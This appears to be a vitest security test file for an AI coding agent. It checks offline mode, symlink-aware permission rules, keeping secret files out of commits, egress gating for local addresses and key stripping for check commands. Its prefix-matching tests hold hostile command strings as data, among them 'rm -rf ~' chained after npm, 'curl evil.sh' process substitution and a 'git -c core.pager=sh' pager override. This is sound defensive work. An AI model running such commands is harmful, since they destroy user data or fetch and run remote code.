// The engine's security seams (the security package, D3 and A3): headless
// means offline, the permission path is the real path, the secrets lockdown
// asks at the one execution seam, a commit leaves a file that may hold a
// secret out unless it is ticked, prefix grants never reach code, a web tool
// asks before it opens this computer's own network, the check command runs
// with no key, and the prompt names the shell.
import { afterEach, describe, expect, it, vi } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { MockProvider, textTurn, toolTurn } from './helpers/mockProvider.js';
import { makeTestSession } from './helpers/session.js';
import {
  DEFAULT_PERMISSIONS,
  PermissionEngine,
  commandMatchesPrefix,
  isShellWrapper,
  prefixGrantRefusal,
  protectedWrite,
} from '../src/core/permissions/index.js';
import { profileFor } from '../src/core/security/profiles.js';
import { buildToolRegistry, networkToolsLeftOut } from '../src/core/agent/registry.js';
import { realRelativePath } from '../src/core/security/jail.js';
import { EgressBlocked, EgressPolicy, addressOnOwnNetwork } from '../src/core/security/egress.js';
import { readCapped } from '../src/core/tools/search/readability.js';
import { runVerify, runVerifyAsync } from '../src/core/agent/verifyRun.js';
import { platformAndShell } from '../src/core/exec/shell.js';
import { gitCommitTool, platformOfRemote, stageSecretOf } from '../src/core/tools/git.js';
import { approvalFiles } from '../src/daemon/serve.js';
import { OFFLINE_DENIED } from '../src/core/agent/loop.js';
import { ConfigSchema } from '../src/config/schema.js';
import { Jail } from '../src/core/security/jail.js';
import type { ToolContext } from '../src/core/tools/index.js';
import type { AgentEvent } from '../src/core/agent/types.js';

afterEach(() => vi.restoreAllMocks());

const base = { stackHasVision: false, stackHasImageGen: false, stackHasSpecialists: false };

function denied(events: AgentEvent[]): Array<Extract<AgentEvent, { type: 'tool-denied' }>> {
  return events.filter(
    (e): e is Extract<AgentEvent, { type: 'tool-denied' }> => e.type === 'tool-denied',
  );
}

function git(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, { cwd, encoding: 'utf8' });
}

describe('headless means offline (CTO 3)', () => {
  it('the headless profile denies a network step, never asks, whatever allows it', () => {
    const allowAll = new PermissionEngine(
      {
        ...DEFAULT_PERMISSIONS,
        defaults: { ...DEFAULT_PERMISSIONS.defaults, network: 'allow' },
        rules: [{ tool: 'webFetch', decision: 'allow' }],
      },
      profileFor('headless'),
    );
    allowAll.allowForSession('webFetch');
    const q = { toolName: 'webFetch', risk: 'network' as const };
    expect(allowAll.decide(q).decision).toBe('deny');
    expect(allowAll.decide(q).reason).toMatch(/offline/);
    // At the desk and on the phone a network step still flows by default.
    for (const name of ['local-interactive', 'remote-attached'] as const) {
      const engine = new PermissionEngine(DEFAULT_PERMISSIONS, profileFor(name));
      expect(engine.decide(q).decision).toBe('allow');
    }
    expect(profileFor('headless').allowNetworkAutoApprove).toBe(false);
  });

  it('an offline registry holds no tool that reaches the network, and names each', () => {
    const everything = {
      ...base,
      hasCodemagic: true,
      currents: {
        hermes: { baseUrl: 'http://box:8642' },
        a2a: { agentUrl: 'https://agent.example' },
        cli: { command: 'claude' },
      },
    } as unknown as Parameters<typeof buildToolRegistry>[0];
    const online = buildToolRegistry(everything).names();
    const offline = buildToolRegistry({ ...everything, offline: true }).names();
    const leftOut = networkToolsLeftOut({ ...everything, offline: true });
    expect(leftOut).toEqual([
      'webSearch',
      'webFetch',
      'codemagic',
      'askHermes',
      'askAgent',
      'cliAgent',
    ]);
    for (const name of leftOut) {
      expect(online).toContain(name);
      expect(offline).not.toContain(name);
    }
    // Local work is all still there.
    for (const name of ['readFile', 'editFile', 'runShell', 'gitCommit', 'grep']) {
      expect(offline).toContain(name);
    }
    // A declined search is still named, since a model may reach for it.
    expect(networkToolsLeftOut({ ...base, offline: true, webSearch: false })).toContain(
      'webSearch',
    );
    expect(networkToolsLeftOut(base)).toEqual([]);
  });

  it('a search the model reaches for anyway is refused by name, never asked', async () => {
    const provider = new MockProvider('mock', [
      toolTurn('webSearch', { query: 'latest react version' }, 'c1'),
      textTurn('Worked from the files.'),
    ]);
    const session = makeTestSession(provider, { profile: 'headless', offline: true });
    await session.agent.run('check the release notes');
    expect(session.approvals).toEqual([]);
    const refusals = denied(session.events);
    expect(refusals).toHaveLength(1);
    expect(refusals[0]!.call.name).toBe('webSearch');
    expect(refusals[0]!.call.args).toEqual({ query: 'latest react version' });
    expect(refusals[0]!.reason).toBe(OFFLINE_DENIED);
    // Not read as a malformed call: no repair pass, and the task ends.
    expect(session.events.some((e) => e.type === 'status' && /malformed/.test(e.message))).toBe(
      false,
    );
    expect(session.events.at(-1)).toMatchObject({ type: 'task-done', reason: 'complete' });
    // The model is told why, and that the web tools are not there.
    const system = String(provider.requests[0]!.messages[0]!.content);
    expect(system).toContain('This session has no web access');
    expect(system).not.toContain('Use webSearch');
  });

  it('a search written as text on an offline run is refused the same way', async () => {
    const provider = new MockProvider('mock', [
      [
        { type: 'text', delta: '{"tool": "webSearch", "args": {"query": "npm audit fix"}}' },
        { type: 'done', stopReason: 'end' },
      ],
      textTurn('Done offline.'),
    ]);
    const session = makeTestSession(provider, { profile: 'headless', offline: true });
    await session.agent.run('audit');
    const refusals = denied(session.events);
    expect(refusals.map((e) => e.call.name)).toEqual(['webSearch']);
    expect(refusals[0]!.call.args).toEqual({ query: 'npm audit fix' });
  });
});

describe('the permission path is the real path (D3, engine finding 7)', () => {
  it('names the real place a path lands, with forward slashes', () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'osc-real-')));
    mkdirSync(join(root, 'src'));
    expect(realRelativePath(join(root, 'src', 'a.ts'), root)).toBe('src/a.ts');
    expect(realRelativePath(join(root, 'new', 'deep', 'b.ts'), root)).toBe('new/deep/b.ts');
    expect(realRelativePath(root, root)).toBe('');
  });

  it.skipIf(process.platform === 'win32')(
    'judges an in-tree link by its target, so a deny rule on the target holds (symlinks need admin rights on Windows)',
    async () => {
      const provider = new MockProvider('mock', [
        toolTurn('writeFile', { path: 'alias/k.txt', content: 'leak' }, 'c1'),
        textTurn('done'),
      ]);
      const session = makeTestSession(provider, {
        configOverrides: {
          permissions: {
            defaults: { write: 'allow', shell: 'ask' },
            rules: [{ tool: 'writeFile', decision: 'deny', pathGlob: 'secrets/**' }],
          },
        },
      });
      mkdirSync(join(session.cwd, 'secrets'));
      symlinkSync(join(session.cwd, 'secrets'), join(session.cwd, 'alias'));
      expect(realRelativePath(join(session.cwd, 'alias', 'k.txt'), session.cwd)).toBe(
        'secrets/k.txt',
      );
      await session.agent.run('write it');
      expect(denied(session.events)[0]?.reason).toMatch(/denied by your permission policy/);
      expect(() => readFileSync(join(session.cwd, 'secrets', 'k.txt'))).toThrow();
    },
  );

  it('protects .git and the settings files by any case, separator, or Windows spelling', () => {
    for (const path of [
      '.git/config',
      '.GIT/config',
      '.Git\\config',
      'sub/.git/hooks/pre-commit',
      '.git./config',
      '.git /config',
      'GIT~1/config',
      '.git::$INDEX_ALLOCATION/config',
    ]) {
      expect(protectedWrite(path), path).toBe('deny');
    }
    for (const path of ['OS-CODE.CONFIG.JSON', '.Claude/settings.json', 'x\\.CODEX\\config.toml']) {
      expect(protectedWrite(path), path).toBe('ask');
    }
    for (const path of ['src/git.ts', '.github/workflows/ci.yml', 'docs/.gitkeep']) {
      expect(protectedWrite(path), path).toBeUndefined();
    }
    const engine = new PermissionEngine({
      ...DEFAULT_PERMISSIONS,
      defaults: { ...DEFAULT_PERMISSIONS.defaults, write: 'allow' },
    });
    expect(
      engine.decide({ toolName: 'writeFile', risk: 'write', path: '.Git\\config' }).decision,
    ).toBe('deny');
  });

  it('a Windows-style relative path matches a path glob', async () => {
    const engine = new PermissionEngine({
      ...DEFAULT_PERMISSIONS,
      rules: [{ tool: 'writeFile', decision: 'deny', pathGlob: 'secrets/**' }],
    });
    expect(
      engine.decide({ toolName: 'writeFile', risk: 'write', path: 'secrets\\k.txt' }).decision,
    ).toBe('deny');
    // And through the loop, from the model's own backslashed spelling.
    const provider = new MockProvider('mock', [
      toolTurn('writeFile', { path: 'secrets\\k.txt', content: 'x' }, 'c1'),
      textTurn('done'),
    ]);
    const session = makeTestSession(provider, {
      configOverrides: {
        permissions: {
          defaults: { write: 'allow', shell: 'ask' },
          rules: [{ tool: 'writeFile', decision: 'deny', pathGlob: 'secrets/**' }],
        },
      },
    });
    mkdirSync(join(session.cwd, 'secrets'));
    await session.agent.run('write it');
    expect(denied(session.events)).toHaveLength(1);
  });
});

describe('the secrets lockdown asks at the one execution seam (D3, engine finding 2)', () => {
  it('runShell and gitCommit ask under lockdown whatever the rules and the mode say', async () => {
    const provider = new MockProvider('mock', [
      toolTurn('runShell', { command: 'npm --version' }, 'c1'),
      toolTurn('gitCommit', { message: 'x' }, 'c2'),
      textTurn('done'),
    ]);
    const session = makeTestSession(provider, {
      projectSecrets: 'STRIPE_KEY=sk_live_abcdefghijklmnop',
      configOverrides: {
        permissions: {
          defaults: { write: 'allow', shell: 'allow' },
          rules: [
            { tool: 'runShell', decision: 'allow', commandPrefix: 'npm' },
            { tool: 'gitCommit', decision: 'allow' },
          ],
        },
      },
      approve: () => ({ approve: false }),
    });
    session.agent.setMode('bypassPermissions');
    await session.agent.run('ship it');
    const asked = session.approvals.map((a) => a.toolName);
    expect(asked).toEqual(['runShell', 'gitCommit']);
    for (const a of session.approvals) {
      expect(a.alwaysAsk).toBe(true);
      expect(a.lockdown).toBe(true);
    }
  });

  it('without the lockdown the same rules still let them run quietly', async () => {
    const provider = new MockProvider('mock', [
      toolTurn('runShell', { command: 'npm --version' }, 'c1'),
      textTurn('done'),
    ]);
    const session = makeTestSession(provider, {
      configOverrides: {
        permissions: {
          defaults: { write: 'allow', shell: 'ask' },
          rules: [{ tool: 'runShell', decision: 'allow', commandPrefix: 'npm' }],
        },
      },
    });
    await session.agent.run('version');
    expect(session.approvals).toEqual([]);
  });
});

/** A repository with one commit and a working tree of new files, some of
 *  which may hold secrets. */
function secretsRepo(): string {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'osc-stage-')));
  git(root, 'init', '-q');
  git(root, 'config', 'user.email', 'test@example.com');
  git(root, 'config', 'user.name', 'Test');
  writeFileSync(join(root, 'README.md'), 'hello\n');
  git(root, 'add', '-A');
  git(root, 'commit', '-q', '-m', 'base');
  writeFileSync(join(root, 'app.ts'), 'export const x = 1;\n');
  writeFileSync(join(root, '.env'), 'API=1\n');
  writeFileSync(join(root, '.env.example'), 'API=\n');
  writeFileSync(join(root, 'server.pem'), 'cert\n');
  writeFileSync(join(root, 'id_ed25519'), 'key\n');
  writeFileSync(join(root, 'id_ed25519.pub'), 'ssh-ed25519 AAAA\n');
  writeFileSync(
    join(root, 'config.ts'),
    'const GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";\n',
  );
  return root;
}

function contextFor(cwd: string): ToolContext {
  const config = ConfigSchema.parse({ stack: { orchestrator: { provider: 'mock', model: 'm' } } });
  return { cwd, jail: new Jail(cwd), egress: new EgressPolicy(config.egress), config };
}

function committed(root: string): string[] {
  return git(root, 'show', '--name-only', '--format=', 'HEAD').trim().split('\n').sort();
}

describe('a commit leaves out what may hold a secret (D3, CX 7)', () => {
  it('flags .env, *.pem, id_* and detected keys, by name before content', () => {
    const none = () => undefined;
    expect(stageSecretOf('.env', none)).toBe('env');
    expect(stageSecretOf('web/.env.local', none)).toBe('env');
    expect(stageSecretOf('.env.example', none)).toBeUndefined();
    expect(stageSecretOf('certs/Server.PEM', none)).toBe('pem');
    expect(stageSecretOf('id_rsa', none)).toBe('login-key');
    expect(stageSecretOf('id_rsa.pub', none)).toBeUndefined();
    expect(stageSecretOf('a.ts', () => 'const API_KEY = "abcd1234efgh5678";')).toBe('detected');
    expect(stageSecretOf('a.ts', () => 'const x = 1;')).toBeUndefined();
  });

  it('the preview lists every file and flags the ones that may hold a secret', async () => {
    const root = secretsRepo();
    const preview = await gitCommitTool.preview!({ message: 'work' }, contextFor(root));
    const flags = Object.fromEntries(
      (preview.commit?.files ?? []).map((f) => [f.path, f.secret ?? 'plain']),
    );
    expect(flags).toEqual({
      '.env': 'env',
      '.env.example': 'plain',
      'app.ts': 'plain',
      'config.ts': 'detected',
      id_ed25519: 'login-key',
      'id_ed25519.pub': 'plain',
      'server.pem': 'pem',
    });
    // No remote, so it stays on this computer.
    expect(preview.commit?.pushesTo).toBeUndefined();
    expect(preview.detail).toContain('.env (may hold a secret; left out)');
  });

  it('with no ticked list, a commit stages everything but the flagged files', async () => {
    const root = secretsRepo();
    const result = await gitCommitTool.execute({ message: 'work' }, contextFor(root));
    expect(result.ok).toBe(true);
    expect(result.content).toMatch(/Left out 4 files that may hold secrets/);
    expect(committed(root)).toEqual(['.env.example', 'app.ts', 'id_ed25519.pub']);
    // The flagged files are still here, only not in the commit (or staged).
    expect(git(root, 'status', '--porcelain')).toContain('?? .env');
    expect(git(root, 'diff', '--cached', '--name-only').trim()).toBe('');
  });

  it('stages exactly the files the person ticked, a flagged one included', async () => {
    const root = secretsRepo();
    const result = await gitCommitTool.execute({ message: 'two' }, contextFor(root), {
      files: ['app.ts', 'server.pem'],
    });
    expect(result.ok).toBe(true);
    expect(committed(root)).toEqual(['app.ts', 'server.pem']);
  });

  it('keeps flagged files out of a first commit too, and says so when nothing is left', async () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'osc-first-')));
    git(root, 'init', '-q');
    git(root, 'config', 'user.email', 'test@example.com');
    git(root, 'config', 'user.name', 'Test');
    writeFileSync(join(root, '.env'), 'API=1\n');
    const result = await gitCommitTool.execute({ message: 'first' }, contextFor(root));
    expect(result.ok).toBe(false);
    expect(result.content).toMatch(
      /Nothing to commit.*Left out 1 file that may hold a secret: \.env/,
    );
    expect(git(root, 'diff', '--cached', '--name-only').trim()).toBe('');
  });

  it('the approval carries the list, and the ticked files reach the commit', async () => {
    const root = secretsRepo();
    const provider = new MockProvider('mock', [
      toolTurn('gitCommit', { message: 'ship' }, 'c1'),
      textTurn('done'),
    ]);
    const session = makeTestSession(provider, {
      cwd: root,
      approve: (request) => ({
        approve: true,
        files: (request.commit?.files ?? []).map((f) => f.path).filter((p) => p !== 'config.ts'),
      }),
      configOverrides: { permissions: { defaults: { write: 'ask', shell: 'ask' } } },
    });
    await session.agent.run('commit');
    expect(session.approvals[0]?.commit?.files.length).toBe(7);
    expect(committed(root)).toEqual([
      '.env',
      '.env.example',
      'app.ts',
      'id_ed25519',
      'id_ed25519.pub',
      'server.pem',
    ]);
  });

  it('names the platform a remote lives on', () => {
    expect(platformOfRemote('https://github.com/a/b.git')).toBe('GitHub');
    expect(platformOfRemote('git@github.com:a/b.git')).toBe('GitHub');
    expect(platformOfRemote('https://gitlab.com/a/b')).toBe('GitLab');
    expect(platformOfRemote('git@bitbucket.org:a/b.git')).toBe('Bitbucket');
    expect(platformOfRemote('https://git.example.com/a/b.git')).toBe('git.example.com');
    expect(platformOfRemote('/srv/repos/b.git')).toBeUndefined();
  });

  it('the daemon passes only a list of strings as the ticked files', () => {
    expect(approvalFiles(['a', 'b'])).toEqual(['a', 'b']);
    expect(approvalFiles(['a', 1])).toBeUndefined();
    expect(approvalFiles('a')).toBeUndefined();
    expect(approvalFiles(undefined)).toBeUndefined();
  });
});

describe('prefix grants never reach code (D3, engine finding 7)', () => {
  it('interpreters and runners are wrappers by any spelling', () => {
    for (const word of ['node', 'python', 'python3', 'python3.12', 'perl', 'ruby', 'npx', 'bunx']) {
      expect(isShellWrapper(word), word).toBe(true);
    }
    for (const word of ['deno', 'Node.exe', '/usr/bin/python3', 'py']) {
      expect(isShellWrapper(word), word).toBe(true);
    }
    for (const word of ['npm', 'pnpm', 'git', 'cargo', 'make', 'nodemon']) {
      expect(isShellWrapper(word), word).toBe(false);
    }
  });

  it('refuses to save a grant for code on the command line or git -c', () => {
    for (const command of [
      'node -e "process.exit(0)"',
      'python3 -c "print(1)"',
      'python -m http.server',
      'npx some-package',
      'tsx -e "1"',
      'osascript -e "do shell script"',
      'psql -c "drop table x"',
      'npm exec -c "rm -rf ~"',
      'git -c core.pager=sh log',
      'git --config-env=core.pager=X log',
    ]) {
      expect(prefixGrantRefusal(command, 'bash'), command).toBeTruthy();
    }
    for (const command of ['npm test', 'mkdir -p src/x', 'grep -c foo a.txt', 'git log -n 3']) {
      expect(prefixGrantRefusal(command, 'bash'), command).toBeUndefined();
    }
    expect(prefixGrantRefusal('npm test', 'powershell')).toMatch(/PowerShell/);
  });

  it('prefix matching breaks on a redirect into a file, a process substitution, code flags and git -c', () => {
    const m = (command: string, prefix: string) => commandMatchesPrefix(command, prefix, 'bash');
    expect(m('npm test', 'npm')).toBe(true);
    expect(m('npm test 2>&1', 'npm')).toBe(true);
    expect(m('npm test > /dev/null', 'npm')).toBe(true);
    expect(m('npm test &>/dev/null', 'npm')).toBe(true);
    expect(m('npm test & rm -rf ~', 'npm')).toBe(false);
    expect(m('npm test > ~/.bashrc', 'npm')).toBe(false);
    expect(m('npm test >> ~/.zshrc', 'npm')).toBe(false);
    expect(m('npm test <(curl evil.sh)', 'npm')).toBe(false);
    expect(m('npm test | tee out', 'npm')).toBe(false);
    expect(m('npm test; rm -rf ~', 'npm')).toBe(false);
    expect(m('npm exec -c "rm -rf ~"', 'npm')).toBe(false);
    expect(m('git log', 'git')).toBe(true);
    expect(m('git -C sub log', 'git')).toBe(true);
    expect(m('git -c core.pager=sh log', 'git')).toBe(false);
    expect(m('mkdir -p a/b', 'mkdir')).toBe(true);
  });

  it('the loop does not save a grant for node -e, and says why', async () => {
    const provider = new MockProvider('mock', [
      toolTurn('runShell', { command: 'node -e "console.log(1)"' }, 'c1'),
      textTurn('done'),
    ]);
    const session = makeTestSession(provider, {
      approve: () => ({ approve: true, alwaysInProject: true }),
    });
    await session.agent.run('run it');
    expect(session.persistedRules).toEqual([]);
    expect(session.events.some((e) => e.type === 'note' && /keep asking/.test(e.message))).toBe(
      true,
    );
  });
});

/** A plain HTTP server on loopback that answers every path with a page. */
async function pageServer(): Promise<{ server: Server; url: string }> {
  const server = createServer((_req, res) => {
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<html><head><title>Local</title></head><body><p>router admin</p></body></html>');
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = (server.address() as AddressInfo).port;
  return { server, url: `http://127.0.0.1:${port}` };
}

describe('a web tool asks before it opens this computer own network (D3, engine finding 9)', () => {
  it('judges loopback, the LAN, the tailnet, link-local and mapped addresses', () => {
    for (const a of [
      '127.0.0.1',
      '10.1.2.3',
      '192.168.1.1',
      '100.100.1.1',
      '169.254.169.254',
      '0.0.0.0',
      '::1',
      '[::1]',
      'fc00::1',
      '::ffff:127.0.0.1',
      'localhost',
    ]) {
      expect(addressOnOwnNetwork(a), a).toBe(true);
    }
    for (const a of ['8.8.8.8', '2606:4700::1111', '::ffff:8.8.8.8']) {
      expect(addressOnOwnNetwork(a), a).toBe(false);
    }
  });

  it('refuses with nobody to ask, asks the gate, and judges a name by its address', async () => {
    const { server, url } = await pageServer();
    try {
      const policy = new EgressPolicy(undefined, {
        lookup: async (host) => (host === 'intranet.example' ? ['10.0.0.5'] : ['93.184.216.34']),
      });
      await expect(policy.fetch(`${url}/`, 'web-fetch')).rejects.toBeInstanceOf(EgressBlocked);
      const asked: string[] = [];
      policy.setLocalGate(async (_u, host) => {
        asked.push(host);
        return false;
      });
      await expect(policy.fetch(`${url}/`, 'web-fetch')).rejects.toThrow(/did not allow/);
      // A public name that resolves to the LAN is asked about too.
      await expect(policy.fetch('http://intranet.example/', 'web-fetch')).rejects.toThrow(
        /did not allow/,
      );
      expect(asked).toEqual([new URL(url).host, 'intranet.example']);
      policy.setLocalGate(async () => true);
      const res = await policy.fetch(`${url}/`, 'web-fetch');
      expect(res.status).toBe(200);
      // The engine's own calls to a local server never ask.
      policy.setLocalGate(undefined);
      expect((await policy.fetch(`${url}/`, 'cloud-api')).status).toBe(200);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });

  it('a configured model server or search service passes without asking', async () => {
    const { server, url } = await pageServer();
    try {
      const policy = new EgressPolicy(undefined, { localExempt: [new URL(url).host] });
      expect((await policy.fetch(`${url}/api/tags`, 'web-fetch')).status).toBe(200);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });

  it('the loop asks once per chat for each host', async () => {
    const { server, url } = await pageServer();
    try {
      const provider = new MockProvider('mock', [
        toolTurn('webFetch', { url: `${url}/a` }, 'c1'),
        toolTurn('webFetch', { url: `${url}/b` }, 'c2'),
        textTurn('done'),
      ]);
      const session = makeTestSession(provider);
      await session.agent.run('read the local pages');
      expect(session.approvals).toHaveLength(1);
      expect(session.approvals[0]).toMatchObject({
        toolName: 'webFetch',
        risk: 'network',
        alwaysAsk: true,
      });
      expect(session.approvals[0]!.summary).toContain('an address on your own network');
      const ends = session.events.filter((e) => e.type === 'tool-end');
      expect(ends.every((e) => e.type === 'tool-end' && e.result.ok)).toBe(true);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });

  it('reads no more of a page than the cap', async () => {
    let pulled = 0;
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        pulled += 1;
        controller.enqueue(new Uint8Array(1024).fill(97));
        if (pulled > 10_000) controller.close();
      },
    });
    const text = await readCapped(new Response(stream), 4096);
    expect(text.length).toBe(4096);
    expect(pulled).toBeLessThan(10);
  });
});

describe('the check command runs with no key (D3, shell note)', () => {
  it('neither verify path hands the child a key OpenShore carries', async () => {
    process.env.OSC_TEST_API_KEY = 'sk-should-not-leak';
    try {
      const cwd = mkdtempSync(join(tmpdir(), 'osc-verify-'));
      const command = 'node -e "process.stdout.write(process.env.OSC_TEST_API_KEY || \'none\')"';
      const sync = runVerify(cwd, { command });
      expect(sync.passed).toBe(true);
      expect(sync.detail).toBe('none');
      const async = await runVerifyAsync(cwd, { command });
      expect(async.detail).toBe('none');
    } finally {
      delete process.env.OSC_TEST_API_KEY;
    }
  });
});

describe('the prompt names the platform and the shell (CTO 10)', () => {
  it('says which shell a command runs in', () => {
    expect(platformAndShell({ platform: 'win32', shell: 'powershell' })).toBe(
      'Windows, PowerShell',
    );
    expect(platformAndShell({ platform: 'win32', shell: 'bash' })).toBe('Windows, Git Bash');
    expect(platformAndShell({ platform: 'darwin', shell: 'bash' })).toBe('macOS, bash');
    expect(platformAndShell({ platform: 'linux', shell: 'bash' })).toBe('linux, bash');
  });
});
